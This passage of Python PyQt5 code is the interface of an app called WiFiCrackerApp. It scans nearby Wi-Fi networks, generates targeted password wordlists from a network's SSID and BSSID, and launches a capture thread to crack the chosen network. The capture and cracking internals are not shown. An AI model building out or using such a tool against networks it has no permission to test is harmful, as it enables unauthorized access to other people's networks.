        self.quick_small_btn = QPushButton("Small (1K passwords)")
        self.quick_small_btn.clicked.connect(lambda: self.quick_generate_wordlist(1000))
        quick_btn_layout.addWidget(self.quick_small_btn)
        
        self.quick_medium_btn = QPushButton("Medium (5K passwords)")
        self.quick_medium_btn.clicked.connect(lambda: self.quick_generate_wordlist(5000))
        quick_btn_layout.addWidget(self.quick_medium_btn)
        
        self.quick_large_btn = QPushButton("Large (10K passwords)")
        self.quick_large_btn.clicked.connect(lambda: self.quick_generate_wordlist(10000))
        quick_btn_layout.addWidget(self.quick_large_btn)
        
        quick_layout.addLayout(quick_btn_layout)
        quick_group.setLayout(quick_layout)
        wordlist_tab_layout.addWidget(quick_group)
        
        # Status
        self.wordlist_status = QLabel("Select a network and click a button to generate wordlist")
        self.wordlist_status.setStyleSheet("QLabel { color: #666; font-style: italic; }")
        wordlist_tab_layout.addWidget(self.wordlist_status)
        
        wordlist_tab_layout.addStretch()
        wordlist_tab.setLayout(wordlist_tab_layout)
        self.tab_widget.addTab(wordlist_tab, "Wordlist Generator")
        
        self.layout.addWidget(self.tab_widget)
        self.setLayout(self.layout)

        self.scan_thread = None
        self.capture_thread = None

    def scan_networks(self):
        self.network_list.clear()
        self.log_text.append("Starting network scan...")
        self.scan_thread = ScanThread()
        self.scan_thread.networks_found.connect(self.display_networks)
        self.scan_thread.error.connect(self.show_error)
        self.scan_thread.start()

    def display_networks(self, networks):
        self.log_text.append(f"Found {len(networks)} networks.")
        for ssid, bssid, channel in networks:
            try:
                ch = int(channel)
                band = "5GHz" if ch > 14 else "2.4GHz"
            except ValueError:
                band = "Unknown"
            self.network_list.addItem(f"{ssid} | {bssid} | {channel} | {band}")

    def show_error(self, message):
        QMessageBox.critical(self, "Error", message)
        self.log_text.append(f"Error: {message}")

    def generate_custom_wordlist(self):
        selected = self.network_list.currentItem()
        if not selected:
            QMessageBox.warning(self, "Warning", "Please select a network first.")
            return
        
        parts = selected.text().split(" | ")
        if len(parts) < 3:
            QMessageBox.warning(self, "Warning", "Invalid network selection.")
            return
        
        ssid, bssid, channel = parts[0], parts[1], parts[2]
        
        dialog = WordlistGeneratorDialog(ssid, bssid, channel)
        if dialog.exec_() == QDialog.Accepted:
            # Optionally set the generated wordlist as the current wordlist
            generated_path = dialog.save_path_input.text()
            if os.path.exists(generated_path):
                self.wordlist_input.setText(generated_path)
                self.log_text.append(f"Custom wordlist generated and set: {generated_path}")

    def quick_generate_wordlist(self, max_passwords):
        selected = self.network_list.currentItem()
        if not selected:
            QMessageBox.warning(self, "Warning", "Please select a network first.")
            self.tab_widget.setCurrentIndex(0)  # Switch to main tab
            return
        
        parts = selected.text().split(" | ")
        if len(parts) < 3:
            QMessageBox.warning(self, "Warning", "Invalid network selection.")
            return
        
        ssid, bssid, channel = parts[0], parts[1], parts[2]
        
        try:
            self.wordlist_status.setText("Generating wordlist...")
            generator = WiFiWordlistGenerator()
            
            passwords = generator.generate_wordlist(
                ssid, bssid, channel, 
                include_common=True, 
                max_length=max_passwords
            )
            
            # Save to file
            safe_ssid = ssid.replace(' ', '_').replace('/', '_')
            filename = f"{safe_ssid}_quick_{max_passwords}.txt"
            filepath = os.path.join(CAPTURE_DIR, filename)
            
            os.makedirs(CAPTURE_DIR, exist_ok=True)
            with open(filepath, 'w', encoding='utf-8') as f:
                for password in passwords:
                    f.write(password + '\n')
            
            # Set as current wordlist
            self.wordlist_input.setText(filepath)
            
            self.wordlist_status.setText(
                f"Generated {len(passwords)} passwords for '{ssid}' → {filename}"
            )
            
            self.log_text.append(f"Quick wordlist generated: {filepath} ({len(passwords)} passwords)")
            
        except Exception as e:
            self.wordlist_status.setText(f"Error generating wordlist: {e}")
            QMessageBox.critical(self, "Error", f"Failed to generate wordlist: {e}")

    def start_capture(self):
        selected = self.network_list.currentItem()
        if not selected:
            QMessageBox.warning(self, "Warning", "Please select a network first.")
            return
        parts = selected.text().split(" | ")
        if len(parts) < 3:
            QMessageBox.warning(self, "Warning", "Invalid network selection.")
            return
        ssid, bssid, channel = parts[0], parts[1], parts[2]
        wordlist = self.wordlist_input.text()
        if not os.path.isfile(wordlist):
            QMessageBox.warning(self, "Warning", "Wordlist file does not exist.")
            return
        capture_time = self.capture_time_spin.value()
        self.log_text.append(f"Starting capture on SSID: {ssid}, BSSID: {bssid}, Channel: {channel}")
        self.capture_button.setEnabled(False)
        self.refresh_button.setEnabled(False)
        self.generate_wordlist_button.setEnabled(False)
        self.capture_thread = CaptureThread(ssid, bssid, channel, wordlist, capture_time)
        self.capture_thread.log_signal.connect(self.append_log)
        self.capture_thread.finished_signal.connect(self.capture_finished)
        self.capture_thread.start()

    def append_log(self, text):
        self.log_text.append(text)
        self.log_text.ensureCursorVisible()

    def capture_finished(self, success, message):
        self.log_text.append(message)
        QMessageBox.information(self, "Capture Finished", message)
        self.capture_button.setEnabled(True)
        self.refresh_button.setEnabled(True)
        self.generate_wordlist_button.setEnabled(True)

    def browse_wordlist(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select Wordlist File", "", "Text Files (*.txt);;All Files (*)")
        if path:
            self.wordlist_input.setText(path)


if __name__ == "__main__":
    app = QApplication(sys.argv)

    # Adapter Selection Dialog
    adapter_dialog = AdapterSelectionDialog()
    if adapter_dialog.exec_() == QDialog.Accepted:
        INTERFACE = adapter_dialog.selected_interface()
        window = WiFiCrackerApp()
        window.show()
        sys.exit(app.exec_())
    else:
        sys.exit(0)